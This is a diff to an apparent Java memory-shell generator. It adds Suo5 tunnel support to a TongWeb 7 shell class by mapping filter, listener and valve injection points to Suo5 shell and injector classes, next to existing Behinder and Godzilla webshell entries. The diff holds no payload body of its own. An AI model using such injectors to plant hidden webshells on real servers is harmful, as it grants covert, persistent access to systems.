@@ -6,13 +6,16 @@ import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
 import com.reajason.javaweb.memshell.shelltool.command.CommandFilterChainAdvisor;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
+import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
 import com.reajason.javaweb.memshell.tomcat.behinder.BehinderListener;
 import com.reajason.javaweb.memshell.tomcat.command.CommandListener;
 import com.reajason.javaweb.memshell.tomcat.godzilla.GodzillaListener;
+import com.reajason.javaweb.memshell.tomcat.suo5.Suo5Listener;
 import com.reajason.javaweb.memshell.tongweb.behinder.BehinderValve7;
 import com.reajason.javaweb.memshell.tongweb.command.CommandValve7;
 import com.reajason.javaweb.memshell.tongweb.godzilla.GodzillaValve7;
 import com.reajason.javaweb.memshell.tongweb.injector.*;
+import com.reajason.javaweb.memshell.tongweb.suo5.Suo5Valve7;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.LinkedHashMap;
@@ -65,6 +68,18 @@ public class TongWeb7Shell extends AbstractShell {
         map.put(JAKARTA_VALVE, Pair.of(BehinderValve7.class, TongWebValveInjector.class));
         map.put(AGENT_FILTER_CHAIN, Pair.of(BehinderFilterChainAdvisor.class, TongWebFilterChainAgentInjector.class));
         map.put(AGENT_CONTEXT_VALVE, Pair.of(BehinderFilterChainAdvisor.class, TongWebContextValveAgentInjector.class));
+        return map;
+    }
+
+    @Override
+    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
+        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
+        map.put(FILTER, Pair.of(Suo5Filter.class, TongWebFilterInjector.class));
+        map.put(JAKARTA_FILTER, Pair.of(Suo5Filter.class, TongWebFilterInjector.class));
+        map.put(LISTENER, Pair.of(Suo5Listener.class, TongWebListenerInjector.class));
+        map.put(JAKARTA_LISTENER, Pair.of(Suo5Listener.class, TongWebListenerInjector.class));
+        map.put(VALVE, Pair.of(Suo5Valve7.class, TongWebValveInjector.class));
+        map.put(JAKARTA_VALVE, Pair.of(Suo5Valve7.class, TongWebValveInjector.class));
         return map;
     }
 }
